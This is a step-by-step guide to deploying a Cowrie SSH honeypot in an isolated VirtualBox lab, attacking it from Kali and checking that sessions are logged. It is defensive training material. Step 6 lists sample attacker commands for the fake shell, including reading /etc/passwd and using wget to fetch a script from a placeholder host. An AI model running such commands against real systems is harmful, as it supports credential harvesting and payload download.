# Cowrie SSH Honeypot — Deployment Guide

This document covers the full deployment of a Cowrie SSH honeypot, from VM creation
through verifying that attacker sessions are logged correctly. Follow these steps to
reproduce the environment on your own machine.

---

## Architecture

- **Linux1** (Linux Mint VM) — runs the Cowrie honeypot
- **Kali** (Kali Linux VM) — used to attack the honeypot
- Both VMs sit on a shared **VirtualBox Host-only network**, isolated from the
  host machine's main network

---

## Prerequisites

- VirtualBox installed on your host machine
- Linux Mint ISO
- Kali Linux ISO
- Minimum 8GB RAM on host (4GB allocated per VM recommended)
- ~40GB free disk space

---

## Step 1: Create the Linux1 VM

1. VirtualBox → New → select Linux Mint ISO
2. Allocate RAM and disk space
3. Complete the Linux Mint installation
4. Install VirtualBox Guest Additions (enables shared clipboard/folders)

---

## Step 2: Configure Networking on Linux1

Linux1 needs **two network adapters**:

- **Adapter 1 — NAT**: gives the VM internet access for installing packages
- **Adapter 2 — Host-only Adapter (vboxnet0)**: lets Kali reach Linux1 directly

If `vboxnet0` doesn't exist yet:

> VirtualBox → Tools → Network → Create Host-only Network

Once both adapters are attached, boot Linux1 and find its Host-only IP:

```bash
ip a
```

Look for the second interface (e.g. `enp0s8`) — its IP (e.g. `192.168.56.104`)
is what Kali will target. The NAT interface (e.g. `enp0s3`, IP like `10.0.2.x`)
is not used for attacking.

---

## Step 3: Install Cowrie on Linux1

```bash
sudo apt update && sudo apt install -y git python3-venv python3-pip
git clone https://github.com/cowrie/cowrie.git
cd cowrie
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install -e .
```

> **Note on config location:** the pip-based install places the config template at
> `src/cowrie/data/etc/cowrie.cfg.dist` — not the classic `etc/cowrie.cfg.dist`
> path referenced in older tutorials. Copy it if you need to customize settings:
> ```bash
> cp src/cowrie/data/etc/cowrie.cfg.dist src/cowrie/data/etc/cowrie.cfg
> ```

Start Cowrie:

```bash
cowrie start
```

---

## Step 4: Verify Cowrie is Running

```bash
cowrie status
```
Expected output: `cowrie is running (PID: xxxx)`

Confirm it's listening on the SSH port:

```bash
sudo ss -tlnp | grep 2222
```
Expected: a `LISTEN` entry on `0.0.0.0:2222` tied to the `twistd` process.

Check the live log for startup errors:

```bash
tail -f var/log/cowrie/cowrie.log
```

---

## Step 5: Create the Kali VM

1. VirtualBox → New → select Kali Linux ISO
2. Complete installation

> **Known issue:** if VM import/creation fails referencing a path in
> `AppData\Local\Temp`, VirtualBox is using a temporary staging path that gets
> cleared before it finishes. **Fix:** extract the Kali ISO/OVA to a permanent
> folder first, then point VirtualBox at that folder.

3. Attach Kali's network adapter to the **same Host-only network (vboxnet0)** as
   Linux1

Confirm Kali's IP is on the same subnet:

```bash
ip a
```
You should see an interface (e.g. `eth0`) with an IP like `192.168.56.103` —
same `192.168.56.x` range as Linux1.

---

## Step 6: Test Connectivity and Attack the Honeypot

From Kali, confirm Linux1 is reachable:

```bash
ping 192.168.56.104
```
Expect 0% packet loss. If this fails, stop here — it's a networking config
issue, not a Cowrie issue.

Then SSH into the honeypot:

```bash
ssh -p 2222 root@192.168.56.104
```

Cowrie accepts **any username/password combination** — that's the trap working.
You'll land in a fake shell. Try running commands to test the emulated
environment and generate log data:

```bash
whoami
id
uname -a
ls -la
cat /etc/passwd
ps aux
ifconfig
wget http://example.com/test.sh
history
```

Exit when done:

```bash
exit
```

---

## Step 7: Verify Session Logging

Back on **Linux1**, check that the session was fully captured:

```bash
tail -50 var/log/cowrie/cowrie.json
```

You should see structured JSON events including:

- `cowrie.login.success` — the login attempt, with `username`, `password`,
  and `src_ip` (should match Kali's IP)
- `cowrie.command.input` — one event per command run, with the exact `input`
  text
- Each event includes `session`, `uuid`, `timestamp`, `src_ip`, and `dst_port`

If both login and command events appear correctly, **deployment is verified
end-to-end.**

---

## Log Schema Reference (for downstream parsing)

| Field       | Description                              |
|-------------|-------------------------------------------|
| `eventid`   | Event type, e.g. `cowrie.login.success`   |
| `session`   | Session identifier                        |
| `src_ip`    | Attacker's IP address                     |
| `dst_port`  | Port Cowrie is listening on (2222)        |
| `timestamp` | ISO 8601 timestamp                        |
| `input`     | Command text (for `command.input` events) |
| `username` / `password` | Login credentials attempted (for `login.*` events) |

This schema is what the log parser (separate module) will consume to populate
the MySQL database.

---

## Notes

- Raw session logs (`cowrie.json`) are **not tracked in this repo** — they're
  generated locally by each deployment and can contain real IPs. See
  `.gitignore`.
- Restart Cowrie after any config change: `cowrie stop && cowrie start`
